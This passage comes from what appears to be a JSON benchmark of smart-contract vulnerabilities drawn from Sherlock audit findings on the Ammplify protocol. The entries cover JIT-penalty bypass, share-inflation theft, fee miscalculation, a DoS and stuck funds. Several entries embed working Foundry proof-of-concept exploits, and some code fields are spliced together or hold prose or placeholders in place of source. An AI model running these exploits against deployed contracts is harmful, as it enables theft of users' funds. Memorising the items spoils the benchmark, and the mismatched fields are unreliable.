        "fix_description": "Apply the JIT penalty inside collectFees before settlement, then update the timestamp. Also update NFTManager.burnAsset if you want to keep the "collect then remove" ordering once collectFees penalizes, the flow is safe. If you prefer not to penalize collect, don't reset asset.timestamp on collectFees. Only update timestamps on liquidity-changing actions.",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "function collectFees(...) external nonReentrant returns (uint256 fees0, uint256 fees1) {  \r\n    ...  \r\n    Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, asset.liq);  \r\n    WalkerLib.modify(pInfo, asset.lowTick, asset.highTick, data);  \r\n    PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n  \r\n    // @ Timestamp is reset here  \r\n    AssetLib.updateTimestamp(asset);  \r\n  \r\n    // @ Fees paid directly; no JIT penalty applied  \r\n    int256;  \r\n    balances[0] = data.xBalance;  \r\n    balances[1] = data.yBalance;  \r\n    RFTLib.settle(recipient, tokens, balances, rftData);  \r\n    fees0 = uint256(-data.xBalance);  \r\n    fees1 = uint256(-data.yBalance);  \r\n}  \r\n  // removeMaker  \r\n(removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  // adjustMaker (removal branch)  \r\n(removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n...  \r\nAssetLib.updateTimestamp(asset);  function applyJITPenalties(Asset storage asset, uint256 xBalance, uint256 yBalance)  \r\n    internal view returns (uint256 xBalanceOut, uint256 yBalanceOut)  \r\n{  \r\n    uint128 duration = uint128(block.timestamp) - asset.timestamp;  \r\n    if (duration >= store.jitLifetime) return (xBalance, yBalance);  \r\n    xBalanceOut = FullMath.mulX64(xBalance, penaltyX64, true);  \r\n    yBalanceOut = FullMath.mulX64(yBalance, penaltyX64, true);  \r\n}  \r\n  (fees0, fees1) = MAKER_FACET.collectFees(...);  \r\n(token0, token1, removedX, removedY) = MAKER_FACET.removeMaker(...);  \r\n  function testJITPenaltyBypassViaCollectFees() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        // Configure JIT penalties: 1 hour lifetime, 50% penalty  \r\n        uint64 jitLifetime = 1 hours;  \r\n        uint64 jitPenaltyX64 = 9223372036854775808; // 50% penalty (0.5 * 2^64)  \r\n  \r\n        adminFacet.setJITPenalties(jitLifetime, jitPenaltyX64);  \r\n  \r\n        // Verify JIT penalty configuration  \r\n        (, , , uint64 storedLifetime, uint64 storedPenalty) = adminFacet.getDefaultFeeConfig();  \r\n        assertEq(storedLifetime, jitLifetime, \"JIT lifetime not set correctly\");  \r\n        assertEq(storedPenalty, jitPenaltyX64, \"JIT penalty not set correctly\");  \r\n  \r\n        // Set initial timestamp  \r\n        vm.warp(1000);  \r\n  \r\n        // Create a fresh maker position (will have timestamp = 1000)  \r\n        uint256 assetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            liquidity,  \r\n            false, // non-compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // Generate fees by performing swaps  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(600));  // Move price up  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(-600)); // Move price back down  \r\n  \r\n        // Advance time by 30 minutes (less than jitLifetime of 1 hour)  \r\n        vm.warp(1000 + 30 minutes);  \r\n  \r\n        // Mock the asset owner for all subsequent calls  \r\n        vm.startPrank(recipient);  \r\n  \r\n        // === DEMONSTRATE THE VULNERABILITY ===  \r\n  \r\n        // First, let's see what happens with direct removal (baseline)  \r\n        // Query the current balances before any action  \r\n        (int256 initialBalance0, int256 initialBalance1, , ) = viewFacet.queryAssetBalances(assetId);  \r\n  \r\n        // Create a snapshot to restore state  \r\n        uint256 snapshot = vm.snapshot();  \r\n  \r\n        // BASELINE: Direct removal with JIT penalty applied to everything  \r\n        (,, uint256 baselineRemovedX, uint256 baselineRemovedY) = makerFacet.removeMaker(  \r\n            recipient,  \r\n            assetId,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // Restore state to before removal  \r\n        vm.revertTo(snapshot);  \r\n  \r\n        // EXPLOIT: collectFees first, then removeMaker  \r\n        // Step 1: Collect fees (bypasses JIT penalty and resets timestamp)  \r\n        (uint256 exploitFees0, uint256 exploitFees1) = makerFacet.collectFees(  \r\n            recipient,  \r\n            assetId,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // Step 2: Remove maker (JIT penalty only applies to remaining principal)  \r\n        (,, uint256 exploitRemovedX, uint256 exploitRemovedY) = makerFacet.removeMaker(  \r\n            recipient,  \r\n            assetId,  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        vm.stopPrank();  \r\n  \r\n        // === VULNERABILITY VERIFICATION ===  \r\n  \r\n        // Calculate total received in each scenario  \r\n        uint256 exploitTotalX = exploitFees0 + exploitRemovedX;  \r\n        uint256 exploitTotalY = exploitFees1 + exploitRemovedY;  \r\n  \r\n        // Verify that the exploit path yields more tokens than baseline  \r\n        assertGt(exploitTotalX, baselineRemovedX, \"Exploit should yield more token0 than baseline\");  \r\n        assertGt(exploitTotalY, baselineRemovedY, \"Exploit should yield more token1 than baseline\");  \r\n  \r\n        // Calculate the extra tokens gained through the exploit  \r\n        uint256 extraX = exploitTotalX - baselineRemovedX;  \r\n        uint256 extraY = exploitTotalY - baselineRemovedY;  \r\n  \r\n        // Verify that fees were actually collected (non-zero)  \r\n        assertGt(exploitFees0, 0, \"Should have collected non-zero fees0\");  \r\n        assertGt(exploitFees1, 0, \"Should have collected non-zero fees1\");  \r\n  \r\n        // The extra amount should be approximately fees * (1 - penaltyFactor)  \r\n        // Since penaltyFactor = 0.5, we expect extra ≈ fees * 0.5  \r\n        uint256 expectedExtraX = exploitFees0 / 2; // 50% of fees  \r\n        uint256 expectedExtraY = exploitFees1 / 2; // 50% of fees  \r\n  \r\n        // Allow for some rounding tolerance (10% tolerance due to complex fee calculations)  \r\n        if (expectedExtraX > 0) {  \r\n            assertApproxEqRel(extraX, expectedExtraX, 0.1e18, \"Extra X should be ~50% of fees\");  \r\n        }  \r\n        if (expectedExtraY > 0) {  \r\n            assertApproxEqRel(extraY, expectedExtraY, 0.1e18, \"Extra Y should be ~50% of fees\");  \r\n        }  \r\n  \r\n        // Log the results for visibility  \r\n        emit log_named_uint(\"Initial Balance0\", uint256(initialBalance0));  \r\n        emit log_named_uint(\"Initial Balance1\", uint256(initialBalance1));  \r\n        emit log_named_uint(\"Baseline Removed X\", baselineRemovedX);  \r\n        emit log_named_uint(\"Baseline Removed Y\", baselineRemovedY);  \r\n        emit log_named_uint(\"Exploit Fees0\", exploitFees0);  \r\n        emit log_named_uint(\"Exploit Fees1\", exploitFees1);  \r\n        emit log_named_uint(\"Exploit Removed X\", exploitRemovedX);  \r\n        emit log_named_uint(\"Exploit Removed Y\", exploitRemovedY);  \r\n        emit log_named_uint(\"Exploit Total X\", exploitTotalX);  \r\n        emit log_named_uint(\"Exploit Total Y\", exploitTotalY);  \r\n        emit log_named_uint(\"Extra X Gained\", extraX);  \r\n        emit log_named_uint(\"Extra Y Gained\", extraY);  \r\n  \r\n    }  ",
            "vulnerable_lines": [
                131,
                132,
                133,
                134,
                135,
                136,
                137,
                138,
                139,
                140,
                141,
                142,
                143,
                144,
                145,
                146,
                147,
                148,
                149,
                150,
                151,
                152,
                153,
                154,
                155
            ],
            "vulnerable_functions": [
                "collectFees"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/integrations/NFTManager.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains burnAsset function that calls collectFees then removeMaker, baking in the JIT penalty bypass"
            }
        ],
        "call_flow": "collectFees -> no JIT penalty applied -> timestamp reset -> removeMaker -> only principal penalized -> attacker keeps full fees",
        "context_hint": "JIT penalty bypass - the collectFees function doesn't apply penalties to collected fees and resets the timestamp, allowing users to collect fees penalty-free then remove principal with only the principal being penalized, enabling classic JIT attacks.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M1",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-1",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "standards_violation",
        "difficulty_tier": 1,
        "context_level": "single_file",
        "finding_title": "DoS of pool if uniswapV3MintCallback's tokenAmountOwed is 0 for a Revert on Zero Value Transfers token",
        "finding_description": "The Readme states that 'Revert on Zero Value Transfers' are expected to work with the protocol, however as there is no amount > 0 check when transferring tokens in PoolFacet.sol#uniswapV3MintCallback() so the function will revert if amountOwed == 0 for the 'Revert on Zero Value Transfers' token. This will DoS all Maker functions & the newTaker/removeTaker functions in the affected tick range as the callback needs to succeed for the PoolWalker.sol#settle() function to complete.",
        "attack_scenario": "1. Create a Uniswap pool where 1 of the tokens is a Revert on Zero Value Transfers Token.\n2. Call any function that calls the PoolWalker.sol#settle() function for a tick range where the uniswap mint callback function will return 0.\n3. Revert when TransferHelper.safeTransfer(pInfo.token, activeMint, amountOwed); is called.\n\nDoS of any operations involving the affected tick range. This means users cannot create/modify/remove/collect fees for the given tick range.",
        "fix_description": "Update Pool.sol#uniswapV3MintCallback() to only perform the transfer if amount > 0:\n\nfunction uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata) external {\n    address activeMint = PoolLib.poolGuard();\n    require(msg.sender == activeMint, UnauthorizedMint(activeMint, msg.sender));\n    PoolInfo memory pInfo = PoolLib.getPoolInfo(activeMint);\n    if (amount0Owed > 0) {\n        TransferHelper.safeTransfer(pInfo.token0, activeMint, amount0Owed);\n    }\n    if (amount1Owed > 0) {\n        TransferHelper.safeTransfer(pInfo.token1, activeMint, amount1Owed);\n    }\n}",
        "primary_file": {
            "path": "Ammplify/src/facets/Pool.sol",
            "content": "Create a Uniswap pool where 1 of the tokens is a Revert on Zero Value Transfers Token.\r\nCall any function that calls the PoolWalker.sol#settle() function for a tick range where the uniswap mint callback function will return 0.\r\nRevert when TransferHelper.safeTransfer(pInfo.token, activeMint, amountOwed); is called.",
            "vulnerable_lines": [
                20,
                21
            ],
            "vulnerable_functions": [
                "uniswapV3MintCallback"
            ]
        },
        "context_files": [],
        "call_flow": "PoolWalker.settle -> PoolLib.mint -> IUniswapV3Pool.mint -> uniswapV3MintCallback(amount=0) -> token.transfer(0) -> revert",
        "context_hint": "Token compatibility issue - tokens that revert on zero-value transfers are not handled in the callback, causing DoS when callback is invoked with 0 amount despite protocol claiming support for these tokens.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_2025-09-ammplify_H6",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "2025-09-ammplify",
        "source_finding_id": "H-6",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "high",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 4,
        "context_level": "cross_contract",
        "finding_title": "User can lose all funds when creating or increasing compounded Maker position due to share inflation first deposit attack in any segment of the user's range",
        "finding_description": "Each segment in the Ammplify protocol functions as a vault for compounded Makers. This enables a first depositor share inflation attack whenever a segment has zero existing liquidity. An attacker can front-run a user’s deposit with a minimal amount of liquidity and then donate assets to the Uniswap pool to inflate the liquidity share price. When the user’s deposit executes, their liquidity rounds down to zero shares, while the deposited assets still increase total liquidity. The attacker can then withdraw all liquidity, stealing the user’s entire deposit.",
        "attack_scenario": "Attacker front-runs a victim depositing into an empty segment, deposits minimal liquidity, inflates share price via Uniswap donation, reduces shares to one, inflates again, then allows victim deposit which mints zero shares. Attacker later withdraws all liquidity, capturing the victim’s funds.",
        "fix_description": "Introduce virtual liquidity balances similar to ERC4626 or enforce minimum liquidity shares alongside minimum liquidity amounts.",
        "primary_file": {
            "path": "Ammplify/src/walkers/Liq.sol",
            "content": "    function uniswapV3FlashCallback(  \r\n        uint256 fee0,  \r\n        uint256 fee1,  \r\n        bytes calldata data  \r\n    ) external {  \r\n        token0.transfer(msg.sender, 1e18+1);  \r\n        token1.transfer(msg.sender, 1e18+1);  \r\n    }  \r\n  \r\n    function testFirstDepositorDrain() public {  \r\n        bytes memory rftData = \"\";  \r\n  \r\n        address victim = makeAddr(\"victimUser\");  \r\n        vm.label(victim, \"victimUser\");  \r\n  \r\n        lowTick = 600;  \r\n        highTick = 720;  \r\n  \r\n        // set current price to the middle of the interval  \r\n        swapTo(0, TickMath.getSqrtRatioAtTick(630));  \r\n  \r\n        uint256 assetId = makerFacet.newMaker(  \r\n            recipient,  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            1e6, // minimum liquidity  \r\n            true, // compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );  \r\n  \r\n        // donate some amount to compound liquidity  \r\n        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, \"\");  \r\n  \r\n        // reduce liquidity shares  \r\n        makerFacet.adjustMaker(recipient, assetId, 4e14, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n  \r\n        // donate again  \r\n        UniswapV3Pool(poolAddr).flash(address(this), 0, 0, \"\");  \r\n  \r\n        // mint new user who should get 0 shares  \r\n        vm.startPrank(victim);  \r\n        MockERC20(token0).mint(victim, 2e18);  \r\n        MockERC20(token1).mint(victim, 2e18);  \r\n        uint balVictim0 = token0.balanceOf(victim);  \r\n        uint balVictim1 = token1.balanceOf(victim);  \r\n        console2.log(\"victim balance before: \", balVictim0, balVictim1);  \r\n        MockERC20(token0).approve(diamond, type(uint256).max);  \r\n        MockERC20(token1).approve(diamond, type(uint256).max);  \r\n        uint256 assetId2 = makerFacet.newMaker(  \r\n            victim,  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            300e18,  \r\n            true, // compounding  \r\n            minSqrtPriceX96,  \r\n            maxSqrtPriceX96,  \r\n            rftData  \r\n        );          \r\n  \r\n        // now close victim position to see how much he gets back  \r\n        makerFacet.removeMaker(victim, assetId2, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n        vm.stopPrank();  \r\n  \r\n        uint balVictim0After = token0.balanceOf(victim);  \r\n        uint balVictim1After = token1.balanceOf(victim);  \r\n        console2.log(\"victim balance after: \", balVictim0After, balVictim1After);  \r\n        console2.log(\"victim balance loss: \", balVictim0 - balVictim0After, balVictim1 - balVictim1After);  \r\n    }  ",
            "vulnerable_lines": [
                260,
                261,
                262,
                263
            ],
            "vulnerable_functions": [
                "modify"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/facets/Maker.sol",
                "content": "// Full file content must be fetched from GitHub",
                "relevance": "Minimum liquidity is enforced but minimum liquidity shares are not, enabling share inflation attacks."
            }
        ],
        "call_flow": "Maker.newMaker() -> Liq.modify() -> shares round down -> zero shares minted -> attacker withdraws inflated liquidity",
        "context_hint": "Liquidity share price can be externally inflated through donations, allowing attackers to cause victim deposits to mint zero shares.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_2025-09-ammplify_H5",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "2025-09-ammplify",
        "source_finding_id": "H-5",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "high",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Borrow fee uses APY as per-second rate, causing extreme overcharging",
        "finding_description": "The borrow fee rate returned by the smooth rate curve is an annual percentage yield (APY), but the implementation treats it as a per-second rate by multiplying it directly by elapsed time. This inflates borrow fees by roughly 31,536,000x, causing catastrophic overcharging even over short durations.",
        "attack_scenario": "Borrower opens a taker position and closes it after a short time. The system multiplies APY directly by seconds elapsed, resulting in massive and unjustified fees that can exceed principal.",
        "fix_description": "Convert APY to per-second rate by dividing by seconds per year using precise math such as FullMath.mulDiv.",
        "primary_file": {
            "path": "Ammplify/src/walkers/Fee.sol",
            "content": "// src/walkers/Fee.sol  \r\n// ... inside FeeWalker.chargeTrueFeeRate(...)  \r\nuint256 timeDiff = uint128(block.timestamp) - data.timestamp; // Convert to 256 for next mult  \r\nuint256 takerRateX64 = timeDiff * data.fees.rateConfig.calculateRateX64(  \r\n    uint64((totalTLiq << 64) / totalMLiq)  \r\n);  // lib/Commons/src/Math/SmoothRateCurveLib.sol  \r\n// ...  \r\n// SPR factor 31536000 = 365 * 24 * 60 * 60  \r\n// APR of 0.001% = 0.00001  \r\n// as a SPR = 0.00001 / 31536000 =  ...  // SPDX-License-Identifier: UNLICENSED  \r\npragma solidity ^0.8.27;  \r\n  \r\nimport { console } from \"forge-std/console.sol\";  \r\nimport { UniswapV3Pool } from \"v3-core/UniswapV3Pool.sol\";  \r\nimport { TickMath } from \"v3-core/libraries/TickMath.sol\";  \r\nimport { AmmplifyAdminRights } from \"../../src/facets/Admin.sol\";  \r\n  \r\nimport { MultiSetupTest } from \"../MultiSetup.u.sol\";  \r\n  \r\nimport { PoolInfo } from \"../../src/Pool.sol\";  \r\nimport { LiqType } from \"../../src/walkers/Liq.sol\";  \r\nimport { TreeTickLib } from \"../../src/tree/Tick.sol\";  \r\nimport { RouteImpl, Route } from \"../../src/tree/Route.sol\";  \r\nimport { KeyImpl, Key } from \"../../src/tree/Key.sol\";  \r\n  \r\nimport { MockERC20 } from \"../mocks/MockERC20.sol\";  \r\n  \r\n/// @dev The minimum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MIN_TICK)  \r\nuint160 constant MIN_SQRT_RATIO = 4295128739;  \r\n/// @dev The maximum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MAX_TICK)  \r\nuint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;  \r\n  \r\ncontract AuditPoCTest is MultiSetupTest {  \r\n    UniswapV3Pool public pool;  \r\n  \r\n    address public poolAddr;  \r\n    int24 public lowTick;  \r\n    int24 public highTick;  \r\n  \r\n    PoolInfo public poolInfo;  \r\n  \r\n  \r\n    function setUp() public {  \r\n        _newDiamond();  \r\n        (, address _pool, address _token0, address _token1) = setUpPool();  \r\n  \r\n        token0 = MockERC20(_token0);  \r\n        token1 = MockERC20(_token1);  \r\n        pool = UniswapV3Pool(_pool);  \r\n  \r\n        poolAddr = _pool;  \r\n        poolInfo = viewFacet.getPoolInfo(poolAddr);  \r\n  \r\n        _createPoolVaults(poolAddr);  \r\n    }  \r\n  \r\n    function test_Invalid_Fee_Rate_PoC() public {  \r\n        // Pool's fee is 3000 bps, tick spacing is 60  \r\n        // 887272 / 60 = 14787.866, nearest power of two is 8192  \r\n        // Tick spacing 0 = tree index 8192  \r\n        // Tick spacing 60 = tree index 8192  \r\n        // etc  \r\n  \r\n        // Grant Taker Rights  \r\n        address taker = makeAddr(\"taker\");  \r\n        adminFacet.submitRights(taker, AmmplifyAdminRights.TAKER, true);  \r\n        vm.warp(block.timestamp + 3 days);  \r\n        adminFacet.acceptRights();  \r\n  \r\n        // Mint some tokens for taker  \r\n        token0.mint(taker, 100e18);  \r\n        token1.mint(taker, 100e18);  \r\n        token0.approve(address(takerFacet), type(uint256).max);  \r\n        token1.approve(address(takerFacet), type(uint256).max);  \r\n  \r\n  \r\n        // Add liquidity between [8192 + 0, 8192 + 2) tree index  \r\n        bytes memory rftData = \"\";  \r\n        lowTick = 60 * 0;  \r\n        highTick = 60 * 2;  \r\n  \r\n        uint256 assetId = makerFacet.newMaker(  \r\n            address(this),  \r\n            poolAddr,  \r\n            lowTick,  \r\n            highTick,  \r\n            100e18,  \r\n            false,  \r\n            MIN_SQRT_RATIO,  \r\n            MAX_SQRT_RATIO,  \r\n            rftData  \r\n        );  \r\n          \r\n        // Taker takes the liquidity  \r\n        vm.prank(taker);  \r\n        uint256 takerAssetId = takerFacet.newTaker(  \r\n            taker,  \r\n            poolAddr,  \r\n            [lowTick, highTick],  \r\n            50e18,  \r\n            [0, 1],  \r\n            [MIN_SQRT_RATIO, MAX_SQRT_RATIO],  \r\n            MIN_SQRT_RATIO,  \r\n            rftData  \r\n        );  \r\n  \r\n        uint256 taker0BalBefore = token0.balanceOf(taker);  \r\n        uint256 taker1BalBefore = token1.balanceOf(taker);  \r\n  \r\n        // 10 seconds pass  \r\n        vm.warp(vm.getBlockTimestamp() + 3600 seconds);  \r\n  \r\n        // Taker removes taker position  \r\n        vm.prank(taker);  \r\n        takerFacet.removeTaker(takerAssetId, MIN_SQRT_RATIO, MAX_SQRT_RATIO, rftData);  \r\n  \r\n        uint256 taker0BalAfter = token0.balanceOf(taker);  \r\n        uint256 taker1BalAfter = token1.balanceOf(taker);  \r\n  \r\n        console.log(\"taker0Bal\", taker0BalBefore, taker0BalAfter);  \r\n        console.log(\"taker1Bal\", taker1BalBefore, taker1BalAfter);  \r\n        console.log(\"taker0Debt\", taker0BalBefore - taker0BalAfter);  \r\n        console.log(\"taker1Debt\", taker1BalBefore - taker1BalAfter);  \r\n    }  \r\n}  ",
            "vulnerable_lines": [
                398
            ],
            "vulnerable_functions": [
                "chargeTrueFeeRate"
            ]
        },
        "context_files": [],
        "call_flow": "removeTaker -> chargeTrueFeeRate -> APY misused as per-second -> massive fee charged",
        "context_hint": "Annualized rate is incorrectly applied as a per-second rate.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_2025-09-ammplify_H4",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "2025-09-ammplify",
        "source_finding_id": "H-4",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "high",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 3,
        "context_level": "cross_contract",
        "finding_title": "Uncollected fees from user's NFT position are stuck in NFTManager",
        "finding_description": "When NFTManager.decomposeAndMint is used, uncollected Uniswap V3 fees are transferred to the NFTManager contract instead of the user. NFTManager never forwards these funds, causing them to be permanently stuck.",
        "attack_scenario": "User decomposes Uniswap V3 NFT. Fees are collected and sent to NFTManager, but no mechanism exists to forward them back to the user, resulting in permanent loss.",
        "fix_description": "Ensure uncollected fees are transferred to the user after decomposition.",
        "primary_file": {
            "path": "Ammplify/src/integrations/NFTManager.sol",
            "content": "            // After primary transfer, sweep any dust the contract may still hold for this token  \r\n            uint256 residual = IERC20(token).balanceOf(address(this));  \r\n            if (residual > 0) {  \r\n                TransferHelper.safeTransfer(token, caller, residual);  \r\n            }      modifier nonReentrant {  \r\n        require(caller == address(0), ReentrancyAttempt());  \r\n        caller = msg.sender;  \r\n        _;  \r\n        caller = msg.sender;  \r\n    }  \r\n  \r\n    function decompose(  \r\n        uint256 positionId,  \r\n        bool isCompounding,  \r\n        uint160 minSqrtPriceX96,  \r\n        uint160 maxSqrtPriceX96,  \r\n        bytes calldata rftData  \r\n    ) external nonReentrant returns (uint256 newAssetId) {          _currentTokenRequester = msg.sender;  \r\n  \r\n        // Decompose the Uniswap V3 position  \r\n        assetId = DECOMPOSER.decompose(positionId, isCompounding, minSqrtPriceX96, maxSqrtPriceX96, rftData);  \r\n  \r\n        // Clear the token requester context  \r\n        _currentTokenRequester = address(0);  \r\n  \r\n        // Mint NFT for the decomposed asset  \r\n        tokenId = _nextTokenId++;  \r\n        assetToToken[assetId] = tokenId;  \r\n        tokenToAsset[tokenId] = assetId;  \r\n        _currentSupply++;  \r\n  \r\n        _safeMint(msg.sender, tokenId);  \r\n  \r\n        emit PositionDecomposedAndMinted(positionId, assetId, tokenId, msg.sender);  \r\n    }  ",
            "vulnerable_lines": [],
            "vulnerable_functions": [
                "decomposeAndMint"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/integrations/UniV3Decomposer.sol",
                "content": "// Full file content must be fetched from GitHub",
                "relevance": "Collects Uniswap fees and transfers them to NFTManager instead of the user."
            }
        ],
        "call_flow": "NFTManager.decomposeAndMint -> UniV3Decomposer.decompose -> fees transferred to NFTManager -> funds stuck",
        "context_hint": "Funds are routed to an intermediate contract without a withdrawal path.",
        "is_vulnerable": true
    }
]